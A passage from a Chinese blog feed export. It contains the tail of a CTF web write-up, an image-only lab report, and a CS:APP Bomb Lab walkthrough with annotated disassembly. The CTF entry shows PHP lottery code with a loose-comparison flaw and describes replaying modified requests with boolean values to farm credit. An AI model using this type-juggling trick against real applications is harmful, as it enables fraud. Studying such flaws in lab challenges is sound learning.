class="variable">$i</span>&lt;<span class="number">7</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$numbers</span>[<span class="variable">$i</span>] == <span class="variable">$win_numbers</span>[<span class="variable">$i</span>])&#123;                <span class="comment">//php弱类型比较</span></span><br><span class="line">			<span class="variable">$same_count</span>++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">switch</span> (<span class="variable">$same_count</span>) &#123;                                   <span class="comment">//猜对的数字</span></span><br><span class="line">		<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">			<span class="variable">$prize</span> = <span class="number">5</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">			<span class="variable">$prize</span> = <span class="number">20</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">			<span class="variable">$prize</span> = <span class="number">300</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">			<span class="variable">$prize</span> = <span class="number">1800</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">			<span class="variable">$prize</span> = <span class="number">200000</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">			<span class="variable">$prize</span> = <span class="number">5000000</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="variable">$prize</span> = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$money</span> += <span class="variable">$prize</span> - <span class="number">2</span>;</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;money&#x27;</span>] = <span class="variable">$money</span>;</span><br><span class="line">	response([<span class="string">&#x27;status&#x27;</span>=&gt;<span class="string">&#x27;ok&#x27;</span>,<span class="string">&#x27;numbers&#x27;</span>=&gt;<span class="variable">$numbers</span>, <span class="string">&#x27;win_numbers&#x27;</span>=&gt;<span class="variable">$win_numbers</span>, <span class="string">&#x27;money&#x27;</span>=&gt;<span class="variable">$money</span>, <span class="string">&#x27;prize&#x27;</span>=&gt;<span class="variable">$prize</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<p>判断相等的数字个数时，用的是==，这不就是个弱类型漏洞吗，bool类型的true是可以和任何数据弱类型相等的</p>
<p>抓包刷钱，然后买flag</p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211018225202078.png" alt="image-20211018225202078"></p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211018225228580.png" alt="image-20211018225228580"></p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>数据通信实验报告</title>
    <url>/2021/05/06/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/</url>
    <content><![CDATA[<h1 id="数据通信实验报告"><a href="#数据通信实验报告" class="headerlink" title="数据通信实验报告"></a>数据通信实验报告</h1><p><img src="/2021/05/06/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/0001.jpg" alt="0001"></p>
<p><img src="/2021/05/06/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/0002.jpg" alt="0002"></p>
<p><img src="/2021/05/06/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/0003.jpg" alt="0003"></p>
]]></content>
      <categories>
        <category>Others</category>
      </categories>
      <tags>
        <tag>课程作业</tag>
      </tags>
  </entry>
  <entry>
    <title>深入理解计算机系统——LAB-3_BombLab</title>
    <url>/2021/05/13/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-3_BombLab/</url>
    <content><![CDATA[<h1 id="深入理解计算机系统——LAB-3-Bomb-Lab"><a href="#深入理解计算机系统——LAB-3-Bomb-Lab" class="headerlink" title="深入理解计算机系统——LAB-3_Bomb_Lab"></a>深入理解计算机系统——LAB-3_Bomb_Lab</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><strong>二进制炸弹实验。</strong></p>
<p>二进制炸弹是一个作为<strong>可执行目标代码文件</strong>提供给学生们的程序。</p>
<p>运行时，它提示用户<strong>输入6个不同的字符串</strong>。</p>
<p>如果其中的任何一个不正确，炸弹就会“爆炸”，打印一条错误信息，并且在一个分级服务器记录事件日志。</p>
<p>学生们必须通过对程序<strong>反汇编和逆向工程</strong>来测定应该是哪6个字符串，从而拆除他们各自炸弹的雷管。</p>
<p>该实验教会学生<strong>理解汇编语言</strong>，并且强制他们学习怎样<strong>使用调试器</strong>。</p>
<h2 id="实验环境和使用工具"><a href="#实验环境和使用工具" class="headerlink" title="实验环境和使用工具"></a>实验环境和使用工具</h2><ul>
<li><p>主机为<code>Windows10</code></p>
</li>
<li><p>运行炸弹的虚拟机<code>Ubuntu12.04.5</code></p>
</li>
<li><p><code>gdb7.4</code>版本</p>
</li>
<li><p><code>objdump2.22</code>版本</p>
</li>
<li><p><code>VS code</code>编辑器，下载了<code>x86 and x86_64 Assembly</code>插件，提供汇编代码高亮功能</p>
</li>
</ul>
<h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><h3 id="准备工作，研究bomb-c源代码"><a href="#准备工作，研究bomb-c源代码" class="headerlink" title="准备工作，研究bomb.c源代码"></a>准备工作，研究<code>bomb.c</code>源代码</h3><p>一共有两个文件：<code>bomb.c</code>和<code>bomb</code>。</p>
<p><code>bomb.c</code>编译得到<code>bomb</code>文件，所以我先研究一下<code>bomb.c</code>的代码</p>
<ul>
<li>代码如下（随便看看）：</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/***************************************************************************</span></span><br><span class="line"><span class="comment"> * Dr. Evil&#x27;s Insidious Bomb, Version 1.1</span></span><br><span class="line"><span class="comment"> * Copyright 2011, Dr. Evil Incorporated. All rights reserved.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * LICENSE:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Dr. Evil Incorporated (the PERPETRATOR) hereby grants you (the</span></span><br><span class="line"><span class="comment"> * VICTIM) explicit permission to use this bomb (the BOMB).  This is a</span></span><br><span class="line"><span class="comment"> * time limited license, which expires on the death of the VICTIM.</span></span><br><span class="line"><span class="comment"> * The PERPETRATOR takes no responsibility for damage, frustration,</span></span><br><span class="line"><span class="comment"> * insanity, bug-eyes, carpal-tunnel syndrome, loss of sleep, or other</span></span><br><span class="line"><span class="comment"> * harm to the VICTIM.  Unless the PERPETRATOR wants to take credit,</span></span><br><span class="line"><span class="comment"> * that is.  The VICTIM may not distribute this bomb source code to</span></span><br><span class="line"><span class="comment"> * any enemies of the PERPETRATOR.  No VICTIM may debug,</span></span><br><span class="line"><span class="comment"> * reverse-engineer, run &quot;strings&quot; on, decompile, decrypt, or use any</span></span><br><span class="line"><span class="comment"> * other technique to gain knowledge of and defuse the BOMB.  BOMB</span></span><br><span class="line"><span class="comment"> * proof clothing may not be worn when handling this program.  The</span></span><br><span class="line"><span class="comment"> * PERPETRATOR will not apologize for the PERPETRATOR&#x27;s poor sense of</span></span><br><span class="line"><span class="comment"> * humor.  This license is null and void where the BOMB is prohibited</span></span><br><span class="line"><span class="comment"> * by law.</span></span><br><span class="line"><span class="comment"> ***************************************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;support.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;phases.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * Note to self: Remember to erase this file so my victims will have no</span></span><br><span class="line"><span class="comment"> * idea what is going on, and so they will all blow up in a</span></span><br><span class="line"><span class="comment"> * spectaculary fiendish explosion. -- Dr. Evil </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">FILE *infile;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *input;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Note to self: remember to port this bomb to Windows and put a </span></span><br><span class="line"><span class="comment">     * fantastic GUI on it. */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* When run with no arguments, the bomb reads its input lines </span></span><br><span class="line"><span class="comment">     * from standard input. */</span></span><br><span class="line">    <span class="keyword">if</span> (argc == <span class="number">1</span>) &#123;  </span><br><span class="line">	infile = <span class="built_in">stdin</span>;</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="comment">/* When run with one argument &lt;file&gt;, the bomb reads from &lt;file&gt; </span></span><br><span class="line"><span class="comment">     * until EOF, and then switches to standard input. Thus, as you </span></span><br><span class="line"><span class="comment">     * defuse each phase, you can add its defusing string to &lt;file&gt; and</span></span><br><span class="line"><span class="comment">     * avoid having to retype it. */</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (argc == <span class="number">2</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span> (!(infile = fopen(argv[<span class="number">1</span>], <span class="string">&quot;r&quot;</span>))) &#123;</span><br><span class="line">	    <span class="built_in">printf</span>(<span class="string">&quot;%s: Error: Couldn&#x27;t open %s\n&quot;</span>, argv[<span class="number">0</span>], argv[<span class="number">1</span>]);</span><br><span class="line">	    <span class="built_in">exit</span>(<span class="number">8</span>);</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* You can&#x27;t call the bomb with more than 1 command line argument. */</span></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Usage: %s [&lt;input_file&gt;]\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Do all sorts of secret stuff that makes the bomb harder to defuse. */</span></span><br><span class="line">    initialize_bomb();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Welcome to my fiendish little bomb. You have 6 phases with\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;which to blow yourself up. Have a nice day!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Hmm...  Six phases must be more secure than one phase! */</span></span><br><span class="line">    input = read_line();             <span class="comment">/* Get input                   */</span></span><br><span class="line">    phase_1(input);                  <span class="comment">/* Run the phase               */</span></span><br><span class="line">    phase_defused();                 <span class="comment">/* Drat!  They figured it out!</span></span><br><span class="line"><span class="comment">				      * Let me know how they did it. */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Phase 1 defused. How about the next one?\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* The second phase is harder.  No one will ever figure out</span></span><br><span class="line"><span class="comment">     * how to defuse this... */</span></span><br><span class="line">    input = read_line();</span><br><span class="line">    phase_2(input);</span><br><span class="line">    phase_defused();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;That&#x27;s number 2.  Keep going!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* I guess this is too easy so far.  Some more complex code will</span></span><br><span class="line"><span class="comment">     * confuse people. */</span></span><br><span class="line">    input = read_line();</span><br><span class="line">    phase_3(input);</span><br><span class="line">    phase_defused();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Halfway there!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Oh yeah?  Well, how good is your math?  Try on this saucy problem! */</span></span><br><span class="line">    input = read_line();</span><br><span class="line">    phase_4(input);</span><br><span class="line">    phase_defused();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;So you got that one.  Try this one.\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* Round and &#x27;round in memory we go, where we stop, the bomb blows! */</span></span><br><span class="line">    input = read_line();</span><br><span class="line">    phase_5(input);</span><br><span class="line">    phase_defused();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Good work!  On to the next...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* This phase will never be used, since no one will get past the</span></span><br><span class="line"><span class="comment">     * earlier ones.  But just in case, make this one extra hard. */</span></span><br><span class="line">    input = read_line();</span><br><span class="line">    phase_6(input);</span><br><span class="line">    phase_defused();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Wow, they got it!  But isn&#x27;t something... missing?  Perhaps</span></span><br><span class="line"><span class="comment">     * something they overlooked?  Mua ha ha ha ha! */</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<ul>
<li><p>首先，我们看到一个有趣的<code>license</code>，（Google翻译）意思是</p>
<blockquote>
<p>Evil Incorporated博士（PERPETRATOR）特此授予您（VICTIM）使用该炸弹（BOMB）的明确许可。 </p>
<p>这是一个有时间限制的许可证，在VICTIM死亡时到期。 </p>
<p>PERPETRATOR对损坏，挫败，精神错乱，虫眼，腕隧道综合症，睡眠不足或对VICTIM造成的其他伤害不承担任何责任。 除非PERPETRATOR想要获得信誉，否则就是这样。</p>
<p> VICTIM不得将此炸弹源代码分发给PERPETRATOR的任何敌人。                     <strong>//重点，问问别人</strong></p>
<p> VICTIM不得调试，反向工程，在其上运行“字符串”，反编译，解密或使用任何其他技术来了解和拆除BOMB。 处理此程序时，不能穿防弹衣。                                                                                                <strong>//重点，使用上述所提到的技术拆除炸弹，穿防弹衣</strong></p>
<p>PERPETRATOR不会因PERPETRATOR糟糕的幽默感而道歉。                            <strong>//哈哈（强颜欢笑）</strong></p>
<p> 在法律禁止BOMB的情况下，此许可无效。                                                                </p>
</blockquote>
</li>
<li><p>,四个头文件，波浪线的两个我们没有，很好，过！<br><img src="/2021/05/13/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-3_BombLab/05/13/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-3_BombLab/image-20210428143806306.png" alt="image-20210428143806306"></p>
</li>
<li><p>注释意思是</p>
<blockquote>
<p>提醒自己：记得把这个文件删掉，这样我的受害者就不会知道发生了什么事，这样他们就会在一场可怕的恐怖爆炸中全部引爆。——邪恶博士                                                                                                           <strong>//重点，看这个文件，我们就知道炸弹怎么做的了</strong></p>
</blockquote>
</li>
<li><p><code>FILE *infile；</code>全局变量，文件指针</p>
</li>
<li><p><code>int main(int argc, char *argv[])</code>主函数，参数<code>argc</code>是提供给主函数的参数个数，参数<code>argv[]</code>是参数的字符串数组的指针。</p>
<blockquote>
<p>举例：./bomb answer.txt   此时，argc=2，argv[0]=”./bomb”，argv[1]=”answer.txt”</p>
</blockquote>
</li>
<li><p><code>char *input;</code>输入字符串的地址</p>
</li>
<li><p>注释环节</p>
<blockquote>
<p>提醒自己：记得将炸弹移植到Windows并在上面放上精美的GUI。                     //老师拿来考试的</p>
</blockquote>
</li>
<li><p>后面的太多了，又看注释又看代码太累，我直接写意思，用法：</p>
<ol>
<li><code>./bomb</code>，然后自己一个一个输入</li>
<li><code>./bomb xxx.txt</code>，不用输入，直接看炸没炸</li>
</ol>
<p>显然我们选第二种，一个一个答案存起来。</p>
</li>
<li><p><code>initialize_bomb();</code>做炸弹函数，我们显然没有这个函数所需要的头文件。</p>
</li>
<li><p>输出文件开始执行的提示信息</p>
</li>
<li><p>接下来是6个<code>phase</code>，<code>phase</code>流程：</p>
<ul>
<li><code>input=read_line();</code>没有函数所需的头文件，功能就是输入字符串或者数字，也就是<code>phase</code>的答案</li>
<li><code>phase_x(input);</code>将输入作为参数运行第x个<code>phase</code>函数</li>
<li><code>phase_defused();</code>看答案是否匹配。</li>
<li>输出成功的提示信息</li>
</ul>
</li>
<li><p>至此，<code>bomb.c</code>已经看完了，我们已经知道炸弹是怎么做的了！</p>
</li>
<li><p>接下来，我们需要反汇编<code>bomb</code>文件，看看这些<code>phase</code>函数都是干什么的！</p>
</li>
</ul>
<h3 id="反汇编bomb文件"><a href="#反汇编bomb文件" class="headerlink" title="反汇编bomb文件"></a>反汇编<code>bomb</code>文件</h3><ul>
<li>在<code>Ubuntu</code>虚拟机中，实验文件夹下，我们执行命令</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">objdump -d bomb &gt; bomb.asm</span><br></pre></td></tr></table></figure>

<ul>
<li>然后将<code>bomb.asm</code>移动到本机，用<code>vscode</code>打开，有1716行汇编代码<br><img src="/2021/05/13/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-3_BombLab/image-20210428154937224.png" alt="image-20210428154937224">、</li>
<li>用<code>objdump</code>反汇编得到的文件，方便我们全局查找，<code>gdb</code>用来调试</li>
</ul>
<h3 id="分析汇编代码"><a href="#分析汇编代码" class="headerlink" title="分析汇编代码"></a>分析汇编代码</h3><p>我们将代码拆成一个函数一个函数进行分析。</p>
<ul>
<li><p>在文件夹下输入命令行使用gdb反汇编函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb bomb</span><br><span class="line">gdb&gt; disassemble &lt;函数名&gt;           </span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="read-line："><a href="#read-line：" class="headerlink" title="read_line："></a><code>read_line</code>：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Dump of assembler code for function read_line:</span><br><span class="line">   0x0804911d &lt;+0&gt;:	sub    $0x2c,%esp                     //栈帧预留0x2c字节的空间</span><br><span class="line">   0x08049120 &lt;+3&gt;:	mov    %ebx,0x20(%esp)                //M(0x20+esp)=ebx</span><br><span class="line">   0x08049124 &lt;+7&gt;:	mov    %esi,0x24(%esp)                //M(0x24+esp)=esi</span><br><span class="line">   0x08049128 &lt;+11&gt;:	mov    %edi,0x28(%esp)            //M(0x28+esp)=edi</span><br><span class="line">   0x0804912c &lt;+15&gt;:	call   0x80490b0 &lt;skip&gt;           //调用skip()</span><br><span class="line">   0x08049131 &lt;+20&gt;:	test   %eax,%eax                  //eax &amp; eax</span><br><span class="line">   0x08049133 &lt;+22&gt;:	jne    0x80491a1 &lt;read_line+132&gt;  //if zf=0, jump 0x80491a1 &lt;read_line+132&gt;</span><br><span class="line">   0x08049135 &lt;+24&gt;:	mov    0x804c3a4,%eax             //eax=M(0x804c3a4)</span><br><span class="line">   //0x804c3a4 &lt;stdin@@GLIBC_2.0&gt;:	 &quot;&quot;</span><br><span class="line">   0x0804913a &lt;+29&gt;:	cmp    %eax,0x804c3d0             //compare M(0x804c3d0) with eax</span><br><span class="line">   //0x804c3d0 &lt;infile&gt;:	 &quot;&quot;</span><br><span class="line">   0x08049140 &lt;+35&gt;:	jne    0x804915a &lt;read_line+61&gt;   //if zf=0, jump 0x804915a &lt;read_line+61&gt;</span><br><span class="line">   0x08049142 &lt;+37&gt;:	movl   $0x804a383,(%esp)          //M(esp)=0x804a383</span><br><span class="line">   //0x804a383:	 &quot;Error: Premature EOF on stdin&quot;</span><br><span class="line">   0x08049149 &lt;+44&gt;:	call   0x8048800 &lt;puts@plt&gt;       //puts(0x804a383)</span><br><span class="line">   0x0804914e &lt;+49&gt;:	movl   $0x8,(%esp)                //M(esp)=0x8</span><br><span class="line">   0x08049155 &lt;+56&gt;:	call   0x8048840 &lt;exit@plt&gt;       //exit(0x8)</span><br><span class="line">   0x0804915a &lt;+61&gt;:	movl   $0x804a3a1,(%esp)          //M(esp)=0x804a3a1</span><br><span class="line">   //0x804a3a1:	 &quot;GRADE_BOMB&quot;</span><br><span class="line">   0x08049161 &lt;+68&gt;:	call   0x80487f0 &lt;getenv@plt&gt;     //getenv@plt(0x804a3a1)</span><br><span class="line">   0x08049166 &lt;+73&gt;:	test   %eax,%eax                  //eax&amp;eax</span><br><span class="line">   0x08049168 &lt;+75&gt;:	je     0x8049176 &lt;read_line+89&gt;   //if zf=1, jump 0x8049176 &lt;read_line+89&gt;</span><br><span class="line">   0x0804916a &lt;+77&gt;:	movl   $0x0,(%esp)                //M(esp)=0x0</span><br><span class="line">   0x08049171 &lt;+84&gt;:	call   0x8048840 &lt;exit@plt&gt;       //exit(0x0)</span><br><span class="line">   0x08049176 &lt;+89&gt;:	mov    0x804c3a4,%eax             //eax=M(0x804c3a4)</span><br><span class="line">   //0x804c3a4 &lt;stdin@@GLIBC_2.0&gt;:	 &quot;&quot;</span><br><span class="line">   0x0804917b &lt;+94&gt;:	mov    %eax,0x804c3d0             //M(0x804c3d0)=eax</span><br><span class="line">   //0x804c3d0 &lt;infile&gt;:	 &quot;&quot;</span><br><span class="line">   0x08049180 &lt;+99&gt;:	call   0x80490b0 &lt;skip&gt;           //调用skip()</span><br><span class="line">   0x08049185 &lt;+104&gt;:	test   %eax,%eax                  //eax &amp; eax</span><br><span class="line">   0x08049187 &lt;+106&gt;:	jne    0x80491a1 &lt;read_line+132&gt;  //if zf=0, jump 0x80491a1 &lt;read_line+132&gt;</span><br><span class="line">   0x08049189 &lt;+108&gt;:	movl   $0x804a383,(%esp)          //M(esp)=0x804a383</span><br><span class="line">   //0x804a383:	 &quot;Error: Premature EOF on stdin&quot;</span><br><span class="line">   0x08049190 &lt;+115&gt;:	call   0x8048800 &lt;puts@plt&gt;       //puts(0x804a383)</span><br><span class="line">   0x08049195 &lt;+120&gt;:	movl   $0x0,(%esp)                //M(esp)=0x0</span><br><span class="line">   0x0804919c &lt;+127&gt;:	call   0x8048840 &lt;exit@plt&gt;       //exit(0x0)</span><br><span class="line">   0x080491a1 &lt;+132&gt;:	mov    0x804c3cc,%edx             //edx=M(0x804c3cc)</span><br><span class="line">   //0x804c3cc &lt;num_input_strings&gt;:	0x00   记录关卡数</span><br><span class="line">   0x080491a7 &lt;+138&gt;:	lea    (%edx,%edx,4),%ebx         //ebx=edx+edx*4=5*edx</span><br><span class="line">   0x080491aa &lt;+141&gt;:	shl    $0x4,%ebx                  //ebx&lt;&lt;4</span><br><span class="line">   0x080491ad &lt;+144&gt;:	add    $0x804c3e0,%ebx            //ebx=ebx+0x804c3e0</span><br><span class="line">   0x080491b3 &lt;+150&gt;:	mov    %ebx,%edi                  //edi=ebx</span><br><span class="line">   0x080491b5 &lt;+152&gt;:	mov    $0x0,%eax                  //eax=0x0</span><br><span class="line">   0x080491ba &lt;+157&gt;:	mov    $0xffffffff,%ecx           //ecx=-1</span><br><span class="line">   0x080491bf &lt;+162&gt;:	repnz scas %es:(%edi),%al         //?</span><br><span class="line">   0x080491c1 &lt;+164&gt;:	not    %ecx                       //ecx=-ecx</span><br><span class="line">   0x080491c3 &lt;+166&gt;:	sub    $0x1,%ecx                  //ecx=ecx-1</span><br><span class="line">   0x080491c6 &lt;+169&gt;:	cmp    $0x4e,%ecx                 //compare ecx with 0x4e</span><br><span class="line">   0x080491c9 &lt;+172&gt;:	jle    0x8049202 &lt;read_line+229&gt;  //if ecx&lt;=0x4e, jump 0x8049202 &lt;read_line+229&gt;</span><br><span class="line">   0x080491cb &lt;+174&gt;:	movl   $0x804a3ac,(%esp)          //M(esp)=0x804a3ac</span><br><span class="line">   //0x804a3ac:	 &quot;Error: Input line too long&quot;</span><br><span class="line">   0x080491d2 &lt;+181&gt;:	call   0x8048800 &lt;puts@plt&gt;       //puts(0x804a3ac)</span><br><span class="line">   0x080491d7 &lt;+186&gt;:	mov    0x804c3cc,%eax             //eax=M(0x804c3cc)</span><br><span class="line">   //0x804c3cc &lt;num_input_strings&gt;:	0x00   记录关卡数</span><br><span class="line">   0x080491dc &lt;+191&gt;:	lea    0x1(%eax),%edx             //edx=0x1+eax         </span><br><span class="line">   0x080491df &lt;+194&gt;:	mov    %edx,0x804c3cc             //M(0x804c3cc)=edx</span><br><span class="line">   0x080491e5 &lt;+200&gt;:	imul   $0x50,%eax,%eax            //eax=eax*0x50</span><br><span class="line">   0x080491e8 &lt;+203&gt;:	add    $0x804c3e0,%eax            //eax=eax+0x804c3e0</span><br><span class="line">   0x080491ed &lt;+208&gt;:	mov    $0x804a3c7,%edx            //edx=0x804a3c7</span><br><span class="line">   //0x804a3c7:	 &quot;***truncated***&quot;</span><br><span class="line">   0x080491f2 &lt;+213&gt;:	mov    $0x4,%ecx                  //ecx=0x4   </span><br><span class="line">   0x080491f7 &lt;+218&gt;:	mov    %eax,%edi                  //edi=eax</span><br><span class="line">   0x080491f9 &lt;+220&gt;:	mov    %edx,%esi                  //esi=edx</span><br><span class="line">   0x080491fb &lt;+222&gt;:	rep movsl %ds:(%esi),%es:(%edi)   //?</span><br><span class="line">   0x080491fd &lt;+224&gt;:	call   0x80490f6 &lt;explode_bomb&gt;   //explode_bomb()</span><br><span class="line">   0x08049202 &lt;+229&gt;:	lea    (%edx,%edx,4),%eax         //eax=5*edx</span><br><span class="line">   0x08049205 &lt;+232&gt;:	shl    $0x4,%eax                  //eax=eax&lt;&lt;4</span><br><span class="line">   0x08049208 &lt;+235&gt;:	movb   $0x0,0x804c3df(%ecx,%eax,1) //M(0x804c3df+ecx+eax)=0x0</span><br><span class="line">   0x08049210 &lt;+243&gt;:	add    $0x1,%edx                  //edx=edx+1</span><br><span class="line">   0x08049213 &lt;+246&gt;:	mov    %edx,0x804c3cc             //M(0x804c3cc)=edx</span><br><span class="line">   0x08049219 &lt;+252&gt;:	mov    %ebx,%eax                  //eax=ebx</span><br><span class="line">   0x0804921b &lt;+254&gt;:	mov    0x20(%esp),%ebx            //ebx=M(0x20+esp)</span><br><span class="line">   0x0804921f &lt;+258&gt;:	mov    0x24(%esp),%esi            //esi=M(0x24+esp)</span><br><span class="line">   0x08049223 &lt;+262&gt;:	mov    0x28(%esp),%edi            //edi=M(0x28+esp)</span><br><span class="line">   0x08049227 &lt;+266&gt;:	add    $0x2c,%esp                 //栈帧释放空间</span><br><span class="line">   0x0804922a &lt;+269&gt;:	ret                               //返回地址出栈，并跳转到返回地址</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<ul>
<li>主函数中多次调用的函数，我们可以得知<ul>
<li><code>0x804c3cc</code>地址存的是关卡数</li>
<li>返回值是字符串地址，并且赋给了<code>input</code></li>
<li><code>0x804c4d0</code>存的是第四关的字符串</li>
</ul>
</li>
</ul>
<h4 id="phase-1："><a href="#phase-1：" class="headerlink" title="phase_1："></a><code>phase_1</code>：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Dump of assembler code for function phase_1:          //函数phase_1(inpput)</span><br><span class="line">   0x08048b50 &lt;+0&gt;:	    sub    $0x1c,%esp            //在栈中预留0x1c字节的空间                      </span><br><span class="line">   0x08048b53 &lt;+3&gt;:     movl   $0x804a1c4,0x4(%esp)  //M(0x4+esp)=0x804a1c4</span><br><span class="line">   0x08048b5b &lt;+11&gt;:	mov    0x20(%esp),%eax       //eax=M(0x20+esp)=input</span><br><span class="line">   0x08048b5f &lt;+15&gt;:	mov    %eax,(%esp)           //M(esp)=eax=input</span><br><span class="line">   0x08048b62 &lt;+18&gt;:	call   0x8048fe4 &lt;strings_not_equal&gt; //调用strings_not_equal(input,0x804a1c4)函数</span><br><span class="line">   0x08048b67 &lt;+23&gt;:	test   %eax,%eax             //eax保存函数返回值,执行eax&amp;eax</span><br><span class="line">   0x08048b69 &lt;+25&gt;:	je     0x8048b70 &lt;phase_1+32&gt; //if zf=1, jump 0x8048b70 &lt;phase_1+32&gt;</span><br><span class="line">   0x08048b6b &lt;+27&gt;:	call   0x80490f6 &lt;explode_bomb&gt; //调用 explode_bomb函数</span><br><span class="line">   0x08048b70 &lt;+32&gt;:	add    $0x1c,%esp             //释放空间</span><br><span class="line">   0x08048b73 &lt;+35&gt;:	ret                           //返回地址出栈，并跳转到返回地址              </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
